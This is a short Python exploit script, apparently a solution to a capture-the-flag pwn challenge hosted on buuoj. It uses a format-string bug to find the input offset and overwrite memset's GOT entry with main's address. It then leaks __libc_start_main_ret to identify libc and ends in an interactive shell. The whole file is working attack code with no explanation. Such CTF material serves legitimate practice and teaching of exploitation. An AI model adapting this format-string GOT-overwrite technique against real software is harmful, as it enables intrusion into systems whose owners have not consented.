import sgtlibc
from sgtlibc.gamebox import *
set_config(GameBoxConfig(
    is_local=True,
    file='./pwn',
    remote='node4.buuoj.cn:25261',
    auto_load=True,
    auto_show_rop=True,
    auto_show_summary=True,
    auto_start_game=True,
    auto_load_shell_str=True,
    auto_show_symbols=True
))
s = sgtlibc.Searcher()
elf = client.elf


def exp(data: bytes):
    start_game()
    sla(b' input name:\n', data)
    r = rl()
    return r


position = formats.exp_get_str_position(exp)


def hijack_memset_to_main_addr():
    start_game()
    memset_got = elf.got['memset']
    main_addr = 0x400aa0
    payload = fmtstr_payload(position, {memset_got: main_addr})
    sla(b' input name:\n', payload)


hijack_memset_to_main_addr()

libc_main_start_position = 25
payload = f'%{libc_main_start_position}$p'
sla(b' input name:\n', payload)
address = rl()[8:20]  # 接收12个字符 6位
address = int(address, 16)
print('address', hex(address))
s.add_condition('__libc_start_main_ret',address)
s.dump()


interactive()
